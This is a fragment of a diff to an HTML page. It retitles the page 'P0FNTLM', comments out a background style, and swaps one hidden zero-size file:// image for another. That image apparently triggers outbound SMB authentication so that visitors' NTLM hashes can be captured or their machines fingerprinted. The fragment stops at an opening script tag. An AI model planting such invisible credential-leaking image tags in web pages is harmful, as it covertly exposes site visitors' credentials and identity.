@@ -1,6 +1,6 @@
-<html><head><meta charset="utf-8" /><title>ＷＩＴＣＨ？</title></head>
-<body style="background-image: url(witch.png); background-repeat: no-repeat; background-attachment: fixed; background-position: right top;">
-<img src="file://witch.valdikss.org.ru/a" width=0 height=0>
+<html><head><meta charset="utf-8" /><title>P0FNTLM</title></head>
+<!--<body style="background-image: url(witch.png); background-repeat: no-repeat; background-attachment: fixed; background-position: right top;"> -->
+<img src="file://sedme/a" width=0 height=0>
 
 <script>
 
